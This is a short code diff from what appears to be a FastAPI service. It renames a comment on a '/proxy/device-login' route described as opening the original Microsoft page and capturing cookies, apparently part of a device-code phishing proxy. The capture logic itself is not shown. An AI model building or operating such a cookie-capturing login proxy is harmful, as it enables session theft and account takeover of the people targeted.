@@ -135,7 +135,7 @@ async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# PROXY - Opens original Microsoft page + captures cookies
+# PROXY REDIRECT - Opens original Microsoft page + captures cookies
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def proxy(device_code: str, request: Request):
     if not ENABLE_PROXY:
